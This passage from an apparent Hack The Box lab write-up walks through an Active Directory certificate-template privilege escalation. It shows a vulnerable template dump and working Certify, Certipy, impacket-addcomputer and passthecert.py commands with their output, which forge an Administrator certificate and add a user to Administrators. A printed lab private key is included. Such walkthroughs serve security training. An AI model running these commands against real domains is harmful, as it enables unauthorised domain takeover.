    1.3.6.1.5.2.3.5 KDC Authentication

  TemplatePropEnrollmentFlags = 19 (25)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16)

  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1

  TemplatePropPrivateKeyFlags = 1010010 (16842768)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
    TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)

  TemplatePropGeneralFlags = 2023a (131642)
    CT_FLAG_ADD_EMAIL -- 2
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_MODIFIED -- 20000 (131072)

  TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-622327497-3269355298-2248959698-519D:PAI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DC)(OA;;CR;a05b8cc2-17bc-4802-a710-e7c15ab866a2;;DC)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-622327497-3269355298-2248959698-519)(A;;LCRPRC;;;DC)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-622327497-3269355298-2248959698-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;LCRPLORC;;;AU)

    Allow Enroll        HTB\Domain Computers
    Allow Auto-Enroll   HTB\Domain Computers
    Allow Enroll        HTB\Domain Admins
    Allow Enroll        HTB\Enterprise Admins
    Allow Read  HTB\Domain Computers
    Allow Full Control  HTB\Domain Admins
    Allow Full Control  HTB\Enterprise Admins
    Allow Full Control  HTB\Administrator
    Allow Read  NT AUTHORITY\Authenticated Users


  TemplatePropExtensions =
4 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 31
    Certificate Template Information
        Template=Corp VPN(1.3.6.1.4.1.311.21.8.9199372.15294569.5129608.13980871.2433934.254.5580598.4156950)
        Major Version Number=100
        Minor Version Number=8

  Extension[1]:
    2.5.29.37: Flags = 0, Length = 4b
    Enhanced Key Usage
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Client Authentication (1.3.6.1.5.5.7.3.2)
        Document Signing (1.3.6.1.4.1.311.10.3.12)
        IP security IKE intermediate (1.3.6.1.5.5.8.2.2)
        IP security user (1.3.6.1.5.5.7.3.7)
        KDC Authentication (1.3.6.1.5.2.3.5)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

  Extension[3]:
    1.3.6.1.4.1.311.21.10: Flags = 0, Length = 59
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Encrypting File System
        [2]Application Certificate Policy:
             Policy Identifier=Secure Email
        [3]Application Certificate Policy:
             Policy Identifier=Client Authentication
        [4]Application Certificate Policy:
             Policy Identifier=Document Signing
        [5]Application Certificate Policy:
             Policy Identifier=IP security IKE intermediate
        [6]Application Certificate Policy:
             Policy Identifier=IP security user
        [7]Application Certificate Policy:
             Policy Identifier=KDC Authentication

  TemplatePropValidityPeriod = 20 Years
  TemplatePropRenewalPeriod = 6 Weeks
```

This template is vulnerable because:

- 1) Domain Computers can request one
```
    Allow Enroll        HTB\Domain Computers
    Allow Auto-Enroll   HTB\Domain Computers
    Allow Enroll        HTB\Domain Admins
    Allow Enroll        HTB\Enterprise Admins
    Allow Read  HTB\Domain Computers
    Allow Full Control  HTB\Domain Admins
    Allow Full Control  HTB\Enterprise Admins
    Allow Full Control  HTB\Administrator
```

- 2) It has Client Authorization EKU, which means the issued cert can be used for Kerberos auth
```
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Encrypting File System
        [2]Application Certificate Policy:
             Policy Identifier=Secure Email
        [3]Application Certificate Policy:
             Policy Identifier=Client Authentication
        [4]Application Certificate Policy:
             Policy Identifier=Document Signing
        [5]Application Certificate Policy:
             Policy Identifier=IP security IKE intermediate
        [6]Application Certificate Policy:
             Policy Identifier=IP security user
        [7]Application Certificate Policy:
             Policy Identifier=KDC Authentication
```

- 3) It lets the enrollee specify the SAN
```
  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
```

We request a certificate for it, still with ceritfy.exe, but we get `Denied by Policy Module` when requesting the certificate, presumably because we are doing that as `svc_ldap`, which is a user and not a computer, and the policy only allows computers.:
```
*Evil-WinRM* PS C:\Certs> ./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : HTB\svc_ldap
[*] No subject name specified, using current context as subject.

[*] Template                : CorpVPN
[*] Subject                 : CN=svc_ldap, OU=Service Accounts, OU=CORP, DC=authority, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : authority.authority.htb\AUTHORITY-CA

[!] CA Response             : The submission failed: Denied by Policy Module
[!] Last status             : 0x80094012. Message: The permissions on the certificate template do not allow the current user to enroll for this type of certificate. (Exception from HRESULT: 0x80094012)
[*] Request ID              : 13

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0MbwEq/cS2N1q8rr/Hpimo35wLI7Pp638YkgFv+nZL/986cE
C/ZjASQFyF9ESohuck2xbhfL6A7/ubmGbbBbjNLE5Nfmc1A8iuAHZH4jPWgJ97m0
LGchE4LY4MxHCQG15GUHXHa4GcjndoqRMR7JF6WiRlTZjZLim5AKL4H6tguHQgMk
XSZhvUMZsZvbAmBGNwVCPclaEC7O7RlF79bd09wEYRiceTN8BmUc1/wfxULQx3TQ
qWUsMvkhjoTBxWQobjz2P4d0J6xTHGuyWuXvCEqs6WBhlFWyK15XgKo7Pe20DJ6f
lWDWvi9+/0A5VLiKj/WWJANkRJdoXGHvmyVg/QIDAQABAoIBAEumOilbRcSfZmz4
W2gh5IbCOSREsMjw9A/2MwWCX2JXWyqlcwbuoVMxfVLsii9DnlmWo1sUDlOo06q1
eetXAuVVHfkZ7iwMf9OGd8dHGXfPsgTsakfImqiaOgHCo161GvaGUROFBRJ6xLwk
W5Xj5NPHtbQsXKQ6/BeIKtiqDXFWtkzvOQ5z9IV98IfH+QOHRQh3U8MIMHD/HdfK
sL2D1R+lZqU+znzTOVAlc4azlRX0tGwTaxcEG5UwpwV+A/0+JJfUhxELlpXy9EIB
yVaUKYSUV5hZM996/YU8f0r1uUrblNFgqtStVz/LynCZkddPmQSV5v4W1T7tGAWn
z3aeRrUCgYEA2+dR1RnwpBa1E/5cKFYn6Oq/siaMrmgFCG/crRyrG43gg0laSKKO
zc7pPCQsGyx76A/vTMX4aAtjpHMpRVD+PsMmuJH4Ni7vuRwEdZSMK1LR+VGTUHVZ
FMLcSX2CHf9xj9uz/LlWaVgrJl5++KS2aIZuJBjrX6AqypC69wFSbu8CgYEA8wwQ
8RxeS+9hrr/Nbcq8ddY2ckeDAcddvPifU/2KyowoFqbbpFxM+G9nZhBfAqED8W4D
KGxt/9/T4gJNtCdcTy0NkFtUwIl04MDPS8btaRpotmNutxkc7GdlwC8xrzbHQxZ/
4yZLLLcVn97swdvFi0iNN63IBk4XhyjZjRALLtMCgYEApiuHb+PZLvWlwcT8+NIZ
+GyjjMiKmCQsYXK+K+Y0+m5ckHi2i5qjFKxdHMAswB/+RZ788mPK0TyCADuxnRqV
9PFc6i4LhU40ggnE6ODmhrpfxum4yxzRwtl4wuPfljF4LAAWY0veG16vxJ+1jMhS
umuTAR3/htQuYcG6Nnq+QusCgYEAkIHeGN2bG18LH1GfHOZrw0xINw5Z0FbvXwoc
AV5AhUlsFHvFICZZBWWHfuHA+9ksdQHKEuDVTkuQuVJRTQoSEmlhJTGIZKnVukQp
fI6cXd973uWj0G24Cr83elsVGW5ib3sTMsVz8PQygUmUT3cSL0xF2pMS2NzZlF0v
bHXbkE0CgYBYwjlnDMw88qp2lYrWu1HpSN+XXA1jQV5k+9+g9WsvbIR1g8TysA2f
avfkpyqrc1lCY9CMMdj3BGyWDo9mZBi0JrN/+khCvI50UB09lg7ymWjOmOPg2ljw
6qcjUl3ry6SMDYtBKQtFlqyqjcza/d4h6zburhhs7apkkx4wq5FoYA==
-----END RSA PRIVATE KEY-----

[X] Error downloading certificate: Cert not yet issued yet! (iDisposition: 2)

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:03.7714194
```

So we need to be a computer right?
```bash
impacket-addcomputer authority.htb/svc_ldap:'lD****************' -computer-name blnkn$ -computer-pass blnkn

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account blnkn$ with password blnkn.
```

Any domain joined user can do this because MachineAccountQuota is not set to 0, 10 is the default.
```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'


DistinguishedName         : DC=authority,DC=htb
ms-DS-MachineAccountQuota : 10
Name                      : authority
ObjectClass               : domainDNS
ObjectGUID                : 011a2802-ff7d-4748-bd64-b7386cae0bd2
```

Trying to request the cert with certipy I get `rpc_s_access_denied`, not sure why
```bash
certipy req -u 'blnkn$' -p 'blnkn' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: rpc_s_access_denied
[-] Use -debug to print a stacktrace
```

Attempting to do that directly from the machine with Certify.exe, looks like the machine flag isn't really doing what I thought it did
```
./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /altname:Administrator /machine

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates
[*] Elevating to SYSTEM context for machine cert request

[!] Unhandled Certify exception:

System.AccessViolationException: Need to be in an elevated context
   at Certify.Lib.Elevator.GetSystem(Action action)
   at Certify.Commands.Request.Execute(Dictionary`2 arguments)
   at Certify.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
   at Certify.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)


Certify completed in 00:00:00.0405701
```

After a few attempts, that finally seems to have worked, not entirely sure what I was doing wrong
```bash
certipy req -u 'kermit-computer$' -p 'kermit-computer' -target 'authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 20
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Use Certipy to extract the key and cert from the `.pfx`
```bash
certipy cert -pfx administrator.pfx -nocert -out user.key
certipy cert -pfx administrator.pfx -nokey -out user.crt
```

With openssl that would look like this:
```bash
openssl rsa -in administrator.pfx
openssl pkcs12 -in administrator.pfx -nokeys
```

Finally we can login to ldap as an admin with `passthecert.py` and add `svc_ldap` to the `administrators` group
```bash
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Type help for list of commands

# add_user_to_group svc_ldap Administrators
Adding user: svc_ldap to group Administrators result: OK

#
```

And boom we're admin... Wow, that was a cool one
```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> net user svc_ldap
User name                    svc_ldap
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/10/2022 9:29:31 PM
Password expires             Never
Password changeable          8/11/2022 9:29:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/5/2023 3:07:58 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
